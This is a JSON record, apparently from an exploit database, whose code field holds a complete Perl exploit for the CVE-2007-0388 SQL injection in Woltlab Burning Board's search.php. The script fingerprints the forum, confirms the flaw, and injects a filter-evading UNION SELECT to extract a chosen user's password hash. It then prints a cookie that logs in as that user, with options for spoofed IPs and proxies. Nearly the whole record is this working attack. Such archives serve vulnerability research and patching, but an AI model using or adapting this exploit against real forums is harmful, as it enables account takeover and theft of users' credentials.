{
  "id": "3144",
  "title": "Woltlab Burning Board 1.0.2/2.3.6 - &#039;search.php&#039; SQL Injection (2)",
  "cve": "CVE-2007-0388",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl\r\n#       Woltlab Burning Board 2.X/Lite search.php SQL Injection exploit - burned.pl\r\n#       written by trew <trew@safe-mail.net>\r\n#\r\n#       should work on every wbb regardless of php settings.\r\n#\r\n#       v 1.2 - added 1337 sql filter evasion, version identification,better regex,raw cookie\r\n# v 1.1 - added wbblite support (thx to lama)\r\n#\r\n#\r\n#\r\n# !PRIVATE! - !PRIVATE!\r\n#\r\n# Leaked by some morons from egocrew\r\n#\r\n\r\n\r\nuse strict;      # 1337\r\nuse warnings;    # 31337\r\nuse LWP::UserAgent;\r\nuse HTTP::Response;\r\nuse HTTP::Status;\r\nuse Getopt::Std;\r\ngetopt('uisUpAclC');\r\nour ( $opt_u, $opt_i, $opt_s, $opt_U, $opt_p, $opt_A, $opt_c, $opt_l, $opt_C );\r\nmy $target = shift;\r\nsub do_request($$);\r\nif ( !$target ) { &HELP_MESSAGE; }\r\nmy ( $host, $folder );\r\n\r\nif ( $target =~ /(?:http:\\/\\/)?([\\w\\.\\-\\_]*)(\\/.*)?/ ) {\r\n\r\n   $host = $1;\r\n   $folder = ( $2 ? $2 : '/' );\r\n   if ( $folder !~ /\\/$/ ) { $folder .= '/'; }\r\n   $target = \"http://$host$folder\" . 'search.php';\r\n}\r\nelse { &HELP_MESSAGE; }\r\n\r\nmy $ip           = ( $opt_i ? $opt_i : '127.0.0.1' );\r\nmy $searchstring = ( $opt_s ? $opt_s : 'board' );\r\nmy ( $userid, $userpassword, $proxy, $proxyip );\r\n( $userid, $userpassword ) = split( ':', $opt_U ) if $opt_U;\r\n( $proxy,  $proxyip )      = split( ':', $opt_p ) if $opt_p;\r\nmy $uid = ( $opt_u ? $opt_u : 1 );\r\nmy $useragent =\r\n ( $opt_A ? $opt_A : 'Mozilla/5.0 Gecko/20061206 Firefox/1.5.0.9' );\r\nmy $prefix = ( $opt_c ? $opt_c : 'wbb2_' );\r\nmy $lite   = ( $opt_l ? $opt_l : 0 );\r\nmy $isHash = 0;\r\n\r\nprint \"burned.pl written by trew\\n\";\r\nprint \"report errors \\@ trew\\@safe-mail.net.. thx\\n\";\r\nprint \"[x] Attacking $target...\\n\";\r\n\r\nif ( $userpassword and $userpassword =~ /([a-f0-9]{32})/ ) { $isHash = 1; }\r\n\r\nif ( !$lite ) {\r\n   print \"[x] Checking wbb version...\\n\";\r\n   if ( do_request( '', 'editor.jar' ) =~ /404 Not Found/ ) {\r\n\r\n       print \"[x] Looks like a wbblite\\n\";\r\n       $prefix = \"\" if ( !$opt_c );\r\n       $lite = 1;\r\n   }\r\n   else { print \"[x] Looks like a normal wbb\\n\"; }\r\n}\r\n\r\nif ( !$lite ) {\r\n   if ( !$opt_c ) {\r\n\r\n       my $headers = do_request( '', '' );\r\n       if ( $headers =~ /Set-Cookie: (.*?)cookiehash/ ) {\r\n           $prefix = $1;\r\n       }\r\n       else { print $headers}\r\n\r\n   }\r\n   print \"[x] Cookie prefix: $prefix\\n\";\r\n}\r\nprint \"[x] Vulnerable check:\";\r\n\r\nmy $answer;\r\nmy $pre;\r\n$answer = do_request( '\\'', '' );\r\n\r\nif ( $answer =~ /FROM (.*?)_boards/ ) {\r\n   $pre = $1;\r\n   print \" Vulnerable\\n\";\r\n}\r\nelsif ($answer =~ /Die Suche ergab keine/\r\n   or $answer =~ /No results were found for this search/\r\n   or $answer =~ /Your search is invalid/\r\n   or $answer =~ /Ihre Suchabfrage ist/ )\r\n{\r\n   print \" No Idea\\n\";\r\n   print \"[x] Searchstring was not found, try a different one with -s\\n\";\r\n   exit;\r\n}\r\nelsif ($answer =~ /Ihnen wird der Zutritt zu dieser Seite/\r\n   or $answer =~ /Access denied/ )\r\n{\r\n   print \" No Idea\\n\";\r\n   print \"[x] search.php only for users,\";\r\n   print \" wrong userdetails or wrong cookie-prefix!\\n\" if $opt_U;\r\n   print \" give me userid+password with -U\\n\"           if !$opt_U;\r\n\r\n   exit;\r\n}\r\nelse {\r\n   print \" Not Vulnerable!\\n\";\r\n\r\n   #print $answer;\r\n   exit;\r\n}\r\n\r\nprint \"[x] Unleashing black magic...\\n\";\r\n$answer = do_request(\r\n   ' UNION/*s12s*/  SELECT/*t35s*/  password , password /*er35*/ FRoM ' . $pre\r\n     . '_users  WHeRE/*esr35*/  userid='\r\n     . $uid . '/*',\r\n   ''\r\n);\r\n\r\nif ( $answer =~ /${folder}search.php/ and $answer =~ /([a-f0-9]{32})/ ) {\r\n   print \"[x] Looks good!\\n\";\r\n   print \"[x] Userid: $uid\\n\";\r\n   print \"[x] Hash: $1\\n\";\r\n   if ( !$opt_C ) {\r\n       print\r\n\"[x] Use this Cookie:\\n ${prefix}userid=$uid;${prefix}userpassword=$1\\n\";\r\n   }\r\n\r\n}\r\nelse {\r\n   print \"[x] Looks bad!\\n\";\r\n   print $answer;\r\n\r\n}\r\n\r\nsub HELP_MESSAGE() {\r\n   print \"burned.pl written by trew\\n\"\r\n     . \"perl $0 [options] url\\n\"\r\n     . \"examples:\\n\"\r\n     . \"perl $0 woltlab.de/forum/\\n\"\r\n     . \"perl $0 -u 2 -i 127.0.0.2 woltlab.de/de/forum/\\n\"\r\n     . \"overwrite -c and -l only when the auto-check \"\r\n     . \"gives you a false result\\n\"\r\n     . \"use -C when you need some special cookies\\n\"\r\n     . \"options :\\n-u userid of victim [1]\\n\"\r\n     . \"-i faked client-ip [127.0.0.1]\\n\"\r\n     . \"-s searchstring [board]\\n\"\r\n     . \"-U userid:password or userid:pwhash [none]\\n\"\r\n     . \"-p proxyip:proxyport [none]\\n\"\r\n     . \"-A user-agent [firefox 1.5.09]\\n\"\r\n     . \"-c cookie-prefix [auto-check]\\n\"\r\n     . \"-l wbblite mode [auto-check]\\n\"\r\n     . \"-C raw cookie\\n\";\r\n   exit;\r\n}\r\n\r\nsub do_request($$) {\r\n   my $string   = shift;\r\n   my $otherurl = shift;\r\n   if ($otherurl) { $target = \"http://$host$folder\" . $otherurl; }\r\n   else { $target = \"http://$host$folder\" . 'search.php' }\r\n   $string = '/*' if ( !$string );\r\n   my $ua = LWP::UserAgent->new;\r\n   if ($proxy) { $ua->proxy( 'http', \"http://$proxy:$proxyip/\" ); }\r\n   my $request = new HTTP::Request( 'POST', $target );\r\n   $request->content( 'boardids%5B0%5D=1&boardids%5B1%5D=2,3,4)' . $string\r\n         . '&send=1&searchstring='\r\n         . $searchstring );\r\n   $request->content_type('application/x-www-form-urlencoded');\r\n   $request->header( 'User-Agent' => $useragent );\r\n\r\n   if ($opt_U) {\r\n       my $userhash;\r\n       if ( !$isHash ) { $userhash = md5($userpassword); }\r\n       else { $userhash = $userpassword; }\r\n       my $cookie = $prefix\r\n         . 'userid='\r\n         . $userid . ';'\r\n         . $prefix\r\n         . 'userpassword='\r\n         . $userhash;\r\n\r\n       $request->header( 'Cookie' => $cookie );\r\n   }\r\n   elsif ($opt_C) {\r\n       $request->header( 'Cookie' => $opt_C );\r\n   }\r\n   $request->header( 'Client-Ip' => $ip );\r\n   my $response = $ua->request($request);\r\n   my $body     = $response->content;\r\n   my $headers  = $response->headers_as_string;\r\n   $body = $response->error_as_HTML if ( $response->is_error );\r\n\r\n   return $headers if ( $string eq '/*' and !$response->is_error );\r\n   return $body;\r\n}\r\n\r\n# MD5 Code ripped from Libwhisker for bigger portability\r\n# thx rfp :)\r\n{\r\n   my ( @S, @T, @M );\r\n   my $code = '';\r\n\r\n   sub md5 {\r\n       return undef if ( !defined $_[0] );    # oops, forgot the data\r\n       my $DATA = _md5_pad( $_[0] );\r\n       &_md5_init() if ( !defined $M[0] );\r\n       return _md5_perl_generated( \\$DATA );\r\n   }\r\n\r\n   sub _md5_init {\r\n       return if ( defined $S[0] );\r\n       my $i;\r\n       for ( $i = 1 ; $i <= 64 ; $i++ ) {\r\n           $T[ $i - 1 ] = int( ( 2**32 ) * abs( sin($i) ) );\r\n       }\r\n       my @t = ( 7, 12, 17, 22, 5, 9, 14, 20, 4, 11, 16, 23, 6, 10, 15, 21 );\r\n       for ( $i = 0 ; $i < 64 ; $i++ ) {\r\n           $S[$i] = $t[ ( int( $i / 16 ) * 4 ) + ( $i % 4 ) ];\r\n       }\r\n       @M = (\r\n           0, 1, 2,  3,  4,  5,  6,  7,  8,  9,  10, 11, 12, 13, 14, 15,\r\n           1, 6, 11, 0,  5,  10, 15, 4,  9,  14, 3,  8,  13, 2,  7,  12,\r\n           5, 8, 11, 14, 1,  4,  7,  10, 13, 0,  3,  6,  9,  12, 15, 2,\r\n           0, 7, 14, 5,  12, 3,  10, 1,  8,  15, 6,  13, 4,  11, 2,  9\r\n       );\r\n       &_md5_generate();\r\n       my $TEST = _md5_pad('foobar');\r\n\r\n       if ( _md5_perl_generated( \\$TEST ) ne\r\n           '3858f62230ac3c915f300c664312c63f' )\r\n       {\r\n           die('Error: MD5 self-test not successful.');\r\n       }\r\n   }\r\n\r\n   sub _md5_pad {\r\n       my $l = length( my $msg = shift() . chr(128) );\r\n       $msg .= \"\\0\" x ( ( $l % 64 <= 56 ? 56 : 120 ) - $l % 64 );\r\n       $l = ( $l - 1 ) * 8;\r\n       $msg .= pack 'VV', $l & 0xffffffff, ( $l >> 16 >> 16 );\r\n       return $msg;\r\n   }\r\n\r\n   sub _md5_generate {\r\n       my $N = 'abcddabccdabbcda';\r\n       my ( $i, $M ) = ( 0, '' );\r\n       $M    = '&0xffffffff' if ( ( 1 << 16 ) << 16 ); # mask for 64bit systems\r\n       $code = <<EOT;\r\n       sub _md5_perl_generated {\r\n       BEGIN { \\$^H |= 1; }; # use integer\r\n       my (\\$A,\\$B,\\$C,\\$D)=(0x67452301,0xefcdab89,0x98badcfe,0x10325476);\r\n       my (\\$a,\\$b,\\$c,\\$d,\\$t,\\$i);\r\n       my \\$dr=shift;\r\n       my \\$l=length(\\$\\$dr);\r\n       for my \\$L (0 .. ((\\$l/64)-1) ) {\r\n               my \\@D = unpack('V16', substr(\\$\\$dr, \\$L*64,64));\r\n               (\\$a,\\$b,\\$c,\\$d)=(\\$A,\\$B,\\$C,\\$D);\r\nEOT\r\n       for ( $i = 0 ; $i < 16 ; $i++ ) {\r\n           my ( $a, $b, $c, $d ) =\r\n             split( '', substr( $N, ( $i % 4 ) * 4, 4 ) );\r\n           $code .=\r\n             \"\\$t=((\\$$d^(\\$$b\\&(\\$$c^\\$$d)))+\\$$a+\\$D[$M[$i]]+$T[$i])$M;\\n\";\r\n           $code .=\r\n\"\\$$a=(((\\$t<<$S[$i])|((\\$t>>(32-$S[$i]))&((1<<$S[$i])-1)))+\\$$b)$M;\\n\";\r\n       }\r\n       for ( ; $i < 32 ; $i++ ) {\r\n           my ( $a, $b, $c, $d ) =\r\n             split( '', substr( $N, ( $i % 4 ) * 4, 4 ) );\r\n           $code .=\r\n             \"\\$t=((\\$$c^(\\$$d\\&(\\$$b^\\$$c)))+\\$$a+\\$D[$M[$i]]+$T[$i])$M;\\n\";\r\n           $code .=\r\n\"\\$$a=(((\\$t<<$S[$i])|((\\$t>>(32-$S[$i]))&((1<<$S[$i])-1)))+\\$$b)$M;\\n\";\r\n       }\r\n       for ( ; $i < 48 ; $i++ ) {\r\n           my ( $a, $b, $c, $d ) =\r\n             split( '', substr( $N, ( $i % 4 ) * 4, 4 ) );\r\n           $code .= \"\\$t=((\\$$b^\\$$c^\\$$d)+\\$$a+\\$D[$M[$i]]+$T[$i])$M;\\n\";\r\n           $code .=\r\n\"\\$$a=(((\\$t<<$S[$i])|((\\$t>>(32-$S[$i]))&((1<<$S[$i])-1)))+\\$$b)$M;\\n\";\r\n       }\r\n       for ( ; $i < 64 ; $i++ ) {\r\n           my ( $a, $b, $c, $d ) =\r\n             split( '', substr( $N, ( $i % 4 ) * 4, 4 ) );\r\n           $code .= \"\\$t=((\\$$c^(\\$$b|(~\\$$d)))+\\$$a+\\$D[$M[$i]]+$T[$i])$M;\\n\";\r\n           $code .=\r\n\"\\$$a=(((\\$t<<$S[$i])|((\\$t>>(32-$S[$i]))&((1<<$S[$i])-1)))+\\$$b)$M;\\n\";\r\n       }\r\n       $code .= <<EOT;\r\n               \\$A=\\$A+\\$a\\&0xffffffff; \\$B=\\$B+\\$b\\&0xffffffff;\r\n               \\$C=\\$C+\\$c\\&0xffffffff; \\$D=\\$D+\\$d\\&0xffffffff;\r\n       } # for\r\n       return unpack('H*', pack('V4',\\$A,\\$B,\\$C,\\$D)); }\r\nEOT\r\n       eval \"$code\";\r\n   }\r\n}    # md5 package container\r\n\r\n# milw0rm.com [2007-01-17]",
  "url": "https://www.exploit-db.com/exploits/3144"
}